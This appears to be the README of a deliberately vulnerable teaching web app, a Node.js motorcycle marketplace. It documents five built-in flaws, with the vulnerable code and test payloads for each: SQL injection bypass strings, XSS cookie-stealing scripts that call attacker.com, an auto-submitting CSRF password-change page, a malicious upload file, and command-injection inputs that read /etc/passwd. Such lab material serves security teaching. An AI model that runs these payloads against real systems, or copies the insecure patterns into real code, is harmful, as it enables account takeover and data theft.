# 🏍️ Moto Marketplace

A motorcycle marketplace web application built for educational purposes to demonstrate common web security vulnerabilities.

## 🛠️ Tech Stack

- **Backend**: Node.js + Express
- **Database**: SQLite3
- **Session Management**: express-session
- **File Upload**: multer
- **Frontend**: HTML + CSS + Minimal JavaScript

## 🚀 Getting Started

### Prerequisites
- Node.js (v14 or higher)
- npm

### Installation

```bash
# Install dependencies
npm install

# Initialize the database with sample data
npm run init-db

# Start the server
npm start
```

### Access the Application
- URL: http://localhost:3000

### Sample User Credentials
| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | admin |
| john | password | user |
| jane | 123456 | user |
| test | test | user |

---

## 📁 Project Structure

```
moto-marketplace/
├── server.js              # Main Express server
├── package.json           # Dependencies
├── database/
│   ├── init.js           # Database initialization
│   ├── db.js             # Database connection
│   └── app.db            # SQLite database
├── public/
│   ├── index.html        # Home page
│   ├── login.html        # Login page
│   ├── register.html     # Registration
│   ├── dashboard.html    # Dashboard
│   ├── post.html         # Single listing view
│   ├── search.html       # Search page
│   ├── upload.html       # File upload
│   ├── messages.html     # Messages
│   ├── tools.html        # Network tools
│   ├── profile.html      # User profile
│   ├── css/style.css     # Styles
│   ├── js/*.js           # JavaScript files
│   └── assets/           # Images and icons
└── uploads/              # Uploaded files directory
```

---

# 🔓 SECURITY TESTING GUIDE

## 5 Implemented Vulnerabilities

---

### 1️⃣ SQL Injection

**Locations**:
- Login: `POST /api/login`
- Registration: `POST /api/register`
- Search: `GET /api/search?q=`

**Vulnerable Code** (server.js - Login):
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**Test Payloads**:

| Attack Type | Payload (Username field) | Expected Result |
|------------|---------|-----------------|
| Authentication Bypass | `' OR '1'='1' --` | Login as first user |
| Login as admin | `admin' --` | Login as admin |
| Extract passwords (Search) | `' UNION SELECT id, username, password, email, role, created_at FROM users --` | Shows all users |
| Show all data | `' OR '1'='1` | Returns all records |

**Testing Steps**:
1. Go to `/login`
2. Enter `' OR '1'='1' --` as username
3. Enter anything as password
4. Click Login - you'll be logged in!

---

### 2️⃣ Cross-Site Scripting (XSS)

**Locations**:
- Posts (title & content): `POST /api/posts`
- Comments: `POST /api/posts/:postId/comments`
- Messages: `POST /api/messages`

**Vulnerable Code**:
```javascript
// No sanitization of user input
container.innerHTML = post.content; // Directly renders HTML
```

**Test Payloads**:

| Type | Payload |
|------|---------|
| Alert Box | `<script>alert('XSS')</script>` |
| Image-based | `<img src=x onerror="alert('XSS')">` |
| SVG-based | `<svg onload="alert(document.cookie)">` |
| Cookie Stealing | `<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>` |

**Testing Steps**:
1. Login and go to `/dashboard`
2. Create a new listing with title: `<script>alert('XSS')</script>`
3. View the listing - the script executes!

---

### 3️⃣ Cross-Site Request Forgery (CSRF)

**Locations**:
- All POST/PUT operations lack CSRF tokens
- Messages: `POST /api/messages`
- Profile Update: `PUT /api/profile`
- Password Change: `POST /api/change-password`
- Transfer: `POST /api/transfer`

**Vulnerable Code**:
```javascript
// No CSRF token validation
app.post('/api/messages', (req, res) => {
    // Processes request without checking origin or token
});
```

**Attack HTML Page** (save as .html and open while logged in):
```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <h1>Loading...</h1>
  <form action="http://localhost:3000/api/change-password" method="POST">
    <input type="hidden" name="newPassword" value="hacked123">
  </form>
</body>
</html>
```

**Testing Steps**:
1. Login as a user on the app
2. Save the above HTML as `csrf_attack.html`
3. Open it in a new tab (same browser)
4. The password changes without user consent!

---

### 4️⃣ File Upload Vulnerability

**Location**: `POST /api/upload`

**Vulnerable Code**:
```javascript
const upload = multer({ 
    storage: storage
    // No file filter - accepts ALL file types
    // No file size limit
});
```

**Dangerous File Types**:

| File Type | Risk |
|-----------|------|
| `.html` | Execute JavaScript in victim's browser |
| `.svg` | SVG files can contain JavaScript |
| `.php` | Web shell if PHP is installed |
| `.exe/.bat` | Malicious executables |

**Malicious HTML File Example** (save as `evil.html`):
```html
<!DOCTYPE html>
<html>
<body>
<script>
  // Steal cookies
  var img = new Image();
  img.src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>
<h1>Loading...</h1>
</body>
</html>
```

**Testing Steps**:
1. Login and go to `/upload`
2. Upload `evil.html`
3. Note the URL (e.g., `/uploads/1234567890-evil.html`)
4. Share this URL with victims

---

### 5️⃣ Command Injection

**Locations**:
- Ping: `POST /api/tools/ping`
- NSLookup: `POST /api/tools/nslookup`
- Traceroute: `POST /api/tools/traceroute`

**Vulnerable Code**:
```javascript
const command = `ping -c 4 ${host}`; // User input directly in command
exec(command, (error, stdout, stderr) => {
    // Executes arbitrary commands
});
```

**Test Payloads**:

| OS | Payload | Description |
|----|---------|-------------|
| Windows | `127.0.0.1 & whoami` | Shows current user |
| Windows | `127.0.0.1 & dir` | Lists directory |
| Windows | `127.0.0.1 \| type C:\Windows\System32\drivers\etc\hosts` | Read hosts file |
| Linux | `127.0.0.1; whoami` | Shows current user |
| Linux | `127.0.0.1; cat /etc/passwd` | Read passwd file |
| Linux | `127.0.0.1 && ls -la` | List directory |

**Testing Steps**:
1. Login and go to `/tools`
2. In the Ping tool, enter: `127.0.0.1 & whoami`
3. Click "Run Ping"
4. Observe the output shows your system username!

---

## 🔧 API Endpoints Summary

| Endpoint | Method | Vulnerability |
|----------|--------|---------------|
| `/api/login` | POST | SQL Injection |
| `/api/register` | POST | SQL Injection |
| `/api/search?q=` | GET | SQL Injection |
| `/api/posts` | POST | XSS |
| `/api/posts/:id/comments` | POST | XSS |
| `/api/messages` | POST | CSRF, XSS |
| `/api/change-password` | POST | CSRF |
| `/api/profile` | PUT | CSRF |
| `/api/upload` | POST | Unrestricted File Upload |
| `/api/tools/ping` | POST | Command Injection |
| `/api/tools/nslookup` | POST | Command Injection |
| `/api/tools/traceroute` | POST | Command Injection |

---

## 🛡️ Security Testing Tools

Recommended tools for testing:
- **OWASP ZAP** - Automated security scanner
- **Burp Suite** - Web security testing
- **SQLmap** - SQL injection testing
- **Nikto** - Web server scanner
